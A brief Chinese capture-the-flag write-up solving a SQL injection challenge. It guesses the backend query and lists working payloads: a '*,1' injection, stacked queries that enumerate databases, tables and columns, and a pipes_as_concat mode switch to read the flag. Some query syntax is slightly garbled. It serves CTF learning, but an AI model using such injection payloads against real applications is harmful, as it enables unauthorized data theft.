## 1.

union注入不可，盲注不可

https://blog.csdn.net/StevenOnesir/article/details/110203051

猜测后端

```
select $_POST['query'] || flag from flag
```

 这里用  

```
*,1
```

放进去后就变成select  *，1 from flag







## 2.堆叠注入

1;show database;

看到ctf

1;use ctf;show tables;

看到Flag

1;use ctf;show columns from Flag;

显示一个数组

```
1;set sql_mode=pipes_as_concat;select 1;
```

这样就变成了

```
select (1.flag) from flag;
```

